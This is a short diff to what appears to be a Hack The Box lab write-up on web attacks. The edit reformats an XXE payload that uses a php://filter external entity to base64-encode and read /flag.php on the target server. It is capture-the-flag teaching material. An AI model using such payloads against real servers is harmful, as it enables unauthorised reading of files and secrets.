@@ -274,15 +274,16 @@ Use the below payload:
 - We'll modify the payload to read `flag.php`.
 
 ```
+
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
-    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
-]>
-            <root>
-            <name>&Test;</name>
-            <details>test</details>
-            <date></date>
-            </root>
+    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">]>
+<root>
+  <name>&Test;</name>
+  <details>test</details>
+   <date></date>
+</root>
+
 ```
 
 ![Reading flag](/images/htb/web-attacks/sa-reading-flag.png)
